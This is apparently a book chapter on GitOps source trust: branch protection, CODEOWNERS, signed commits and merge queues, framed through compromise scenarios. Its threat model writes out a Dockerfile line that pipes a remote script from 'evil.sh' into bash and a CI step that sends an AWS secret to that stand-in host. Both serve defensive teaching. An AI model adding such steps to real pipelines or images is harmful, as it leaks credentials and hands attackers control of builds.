---
title: Git as the Root of Trust
description: "In a GitOps world, whoever controls Git controls production. Why Git — code, manifests, Terraform, policy — is the root of trust for everything you ship, and how to protect it."
sidebar:
  label: 3. Git as the Root of Trust
  order: 1
---

> **Chapter 3** · Source Trust

## Why this exists

In a GitOps world, Git is not "where code lives." Git is the **root of trust for your entire company's production environment**. Application code, Dockerfiles, pipeline definitions, Terraform, Helm charts, Kubernetes manifests, policy definitions — in a mature platform, *everything that determines what runs in production* is a file in Git. Which means:

> Whoever controls Git controls production. The entire question of source trust is: *what does it take to change what Git says?*

## Mental model

Think of a protected branch as a **legal contract with enforcement**: "no change becomes truth without review by an owner, passing checks, and an immutable record of who did what." Everything in this chapter is a clause in that contract, and every attack is an attempt to find a clause that's missing.

## Architecture

A mature repository architecture layers these controls:

**Branch protection (the enforcement engine).** On `main`: require PRs (no direct pushes), require ≥1–2 approvals, require review from CODEOWNERS, dismiss stale approvals when new commits are pushed, require status checks (CI, security scans) to pass, require branches to be up to date, block force pushes and deletions — *and apply the rules to administrators*. That last checkbox is the most commonly missed and the most important: unenforced-on-admins protection means "every admin account is a bypass."

**CODEOWNERS (the review routing layer).** Ownership is not documentation — it's an access control primitive. The critical insight: *sensitive paths need stricter owners than the code around them*:

```
# CODEOWNERS
*                     @org/service-team
/Dockerfile           @org/platform-team
/.github/workflows/   @org/platform-team @org/security
/terraform/           @org/infra-team
/helm/                @org/platform-team
```

Why? Because a change to `.github/workflows/build.yml` is a change to *the machine that produces your production artifacts*. An app developer approving their teammate's workflow change is CI's equivalent of letting tenants rekey the building's locks.

**Signed commits and protected tags.** Commit signing (GPG, SSH, or gitsign with Sigstore) binds a commit to an identity, closing the "git config user.email spoofing" hole — by default, Git lets anyone claim to be anyone. Protected tags matter because releases are often cut from tags: if anyone can move `v2.1.0`, anyone can change what "version 2.1.0" means.

**Merge queues.** Beyond throughput, a merge queue guarantees that what lands on `main` was tested *in the exact state it will exist on main* — closing the gap where two individually-green PRs are jointly broken (or jointly malicious).

## Threat model & compromise scenarios

**Scenario 1 — Stolen GitHub token.** A developer's PAT leaks (committed to a public repo, stolen by a malicious npm package reading `~/.gitconfig` and env vars — this is exactly what real infostealer packages do). What can the attacker do?
- No branch protection → push directly to main → *game over, silently.*
- Branch protection but token owner can approve own PRs via a second account, or protection exempts admins → game over with slightly more steps.
- Full protection + CODEOWNERS + signed commits required → attacker can open PRs and... wait for review. The attack is now *loud and slow*. That's the win condition: you rarely make attacks impossible; you make them require a second, independent compromise.

**Scenario 2 — Malicious Dockerfile change.** A one-line PR: `RUN curl -s https://evil.sh | bash` buried in a 40-file refactor, or subtler: changing the base image to `attacker/python:3.12` (typosquatted). If Dockerfiles have no dedicated CODEOWNERS, the same team that's rubber-stamping each other's app code approves it. Defense: path-based ownership + a CI check that diffs base images against an allowlist.

**Scenario 3 — Pipeline modification.** The highest-leverage file in any repo is the CI workflow. A PR that adds one step — `echo "${{ secrets.AWS_KEY }}" | curl -d @- evil.sh` — turns your build system into an exfiltration tool. Worse: on GitHub, a `pull_request_target` workflow runs with *secrets access against attacker-controlled PR code* if misconfigured. This exact pattern has burned dozens of major open-source projects.

**Scenario 4 — Terraform modification.** `terraform/iam.tf` gets a new policy attachment granting a role `AdministratorAccess`. It merges, the pipeline applies it, and the attacker now has a legitimate, Terraform-managed backdoor that survives credential rotation. Infrastructure code needs *stricter* review than app code because its blast radius is the cloud account, not the service.

## The architect's question: if Git is compromised, what happens?

Play it out honestly. Attacker controls Git (admin token, or the platform itself):
- They can change any code, any pipeline, any manifest → in a naive GitOps setup, *everything downstream obeys*.
- What survives? **Independent verification that doesn't live in Git.** If your admission controller requires artifacts signed by your real CI with provenance chaining to reviewed commits, an attacker with Git access still has to get their code *through the real build system* — visible, logged, attested. If your signing keys and policy are managed outside the compromised domain, Git compromise becomes "attacker can propose anything" instead of "attacker can run anything."
- This is why the answer to "what if X is compromised?" is never inside X. It's always in the *next* boundary.

## Common mistakes

- Branch protection that doesn't apply to admins ("break-glass" that's really "always-open door")
- CODEOWNERS file that isn't itself owned by a locked-down team (attackers edit CODEOWNERS first, then everything else)
- Requiring reviews but allowing the PR author's approval to count, or not dismissing stale reviews
- Treating `.github/workflows/`, `Dockerfile`, `terraform/` as ordinary code
- Long-lived PATs with `repo` scope everywhere; no token expiry or fine-grained scoping

## Design review questions

- Show me the exact set of humans who can get a change into `main` with zero other-person involvement. (The honest answer is often "all admins plus anyone who can edit CODEOWNERS.")
- Who reviews changes to the CI workflows? To CODEOWNERS itself?
- If I steal one developer laptop tonight, what's in production tomorrow?

## Implementation examples

GitHub: branch protection rules / rulesets, required signed commits, CODEOWNERS, merge queue, fine-grained PATs, push protection for secrets. GitLab: protected branches, approval rules, push rules. Gitea/Bitbucket: equivalents exist; the architecture is identical.

:::tip[Key Takeaways]

- Git is the root of trust; treat write-access-to-main as production access, because it is.
- Path-based ownership: pipelines, Dockerfiles, and IaC are platform-security surfaces, not app code.
- Controls exist to make attacks *require a second independent compromise* and to make them loud.
- The defense against total Git compromise lives outside Git.
:::

## Architecture Conversation

**E:** We require two approvals on everything. Isn't that enough?

**A:** Two approvals from whom?

**E:** Any two engineers with write access.

**A:** So a malicious change to your deploy workflow can be approved by two frontend interns. And if I compromise two accounts — or one account plus create one bot account with write access — I need zero real humans. What's the property you actually want?

**E:** That changes to *dangerous* paths require approval from people who understand *that danger*. Workflows need platform/security review, Terraform needs infra review.

**A:** Right — review quality is path-dependent. Now, harder: your CODEOWNERS file routes those reviews. Who can change CODEOWNERS?

**E:** ...Anyone with write access, with two generic approvals. So the routing table for all security review is itself unprotected. I'd protect CODEOWNERS with the strictest owner set in the file.

**A:** Good. Notice the pattern — the attacker always goes for the control plane of the control, not the control. Remember that when we get to CI.
